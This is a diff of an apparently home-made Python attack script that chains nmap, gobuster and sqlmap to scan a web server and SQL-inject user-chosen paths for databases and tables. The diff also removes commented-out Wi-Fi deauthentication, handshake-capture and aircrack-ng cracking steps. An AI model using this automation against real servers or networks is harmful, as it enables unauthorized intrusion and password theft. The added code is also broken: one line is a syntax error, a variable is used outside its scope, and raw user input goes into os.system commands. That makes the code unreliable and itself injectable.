@@ -82,79 +82,27 @@ def sqlmap(webserver):
     hidden_path = input("What hidden path would you like to SQL inject? ")
     inject_options_output()
     option_chosen = int(input())
-    cmd = "sqlmap -u " + webserver + hidden_path + injection_options[option_chosen - 1] + " --dbs"
+    base_cmd = "sqlmap -u " + webserver + hidden_path + injection_options[option_chosen - 1]
+    cmd = base_cmd " --dbs"
     try:
         os.system(cmd)
     except KeyboardInterrupt:
-        print ("Gobuster failed. Run script again")
+        print ("SQLMap failed. Run script again")
 
-
-'''
-def network_teardown(int_name):
+def database_stuff(code_cmd):
+    database = input("What database would you like to attack? ")
+    cmd = base_cmd + " -D " + database +  " --tables"
     try:
-        os.system("airmon-ng stop %s" %int_name)
-        os.system("service network-manager restart")
-    except NameError:
-        print("Network Interface \"%s\" does not exist" %int_name)
-
-def network_sniff(interface_name):
-    try:
-        os.system("airodump-ng -a -w testcap %s" %interface_name)
-    except KeyboardInterrupt:
-        print ("Network Sniffing Ended")
-
-def deauth_bomb(int_name, number_deauth_packets):
-    try:
-        ssid_name = str(raw_input("What are the first 3 letters of the ssid you want to target? (Case Sensitive) "))
-
-        cmd = "cat testcap-01.csv | grep " + ssid_name + " | awk '{print $1}' | awk -F',' 'NR==1{print $1}'"
-        bssid = str(os.popen(cmd).read()).strip('\n')
-
-        cmd = "cat testcap-01.csv | grep " + bssid + " | awk '{print $6}' | awk -F',' 'NR==1{print $1}'"
-        channel = str(os.popen(cmd).read()).split('\n')[0]
-
-        cmd = "iwconfig " + int_name + " channel " + channel
         os.system(cmd)
-
-        cmd = "aireplay-ng -0 " + str(number_deauth_packets) + " -a " + bssid + " " + int_name
-        subprocess.call(cmd, shell=True)
-        return bssid, channel
-
     except KeyboardInterrupt:
-        return bssid
-'''
+        print ("SQLMap - search for database failed. Run script again")
+
+    
+
+
+
 if __name__ == "__main__":
      # ASCII art for tool name? Option to show user instructions and purpose of project?
     webserver = nmap_scan() # should we clean up nmap output? put output in a seperate file? Give a warning to user when zero hosts are found?
     gobuster(webserver)
     sqlmap(webserver)
-    
-
-
-'''
-    os.system("rm testcap*")
-    os.system("rm captured*")
-    display_ascii_logo()
-    display_ascii_bomb()
-    os.system("iwconfig")
-
-    interface_name = raw_input("What is the name of your wireless interface? ")
-
-    print ("\nSetting up Nic Parameters")
-    int_name = network_setup(interface_name)
-
-    print ("\nsniffing network, press CTRL+C when you see a network you want to target")
-    network_sniff(int_name)
-
-    print ("\nWith user input, sending De-Auth bomb")
-    bssid, channel = deauth_bomb(int_name, number_deauth_packets)
-
-    print ("Capturing 4-way handshake, targeting " + str(bssid))
-    capture_handshake(bssid, int_name, channel)
-
-    print("\nResetting Nic Parameters and restarting Network-Manager.\n")
-    network_teardown(int_name)
-
-    cmd = "aircrack-ng -w /usr/share/john/password.lst -b " + bssid + " captured_packet-01.cap"
-    subprocess.call(cmd, shell=True)
-'''
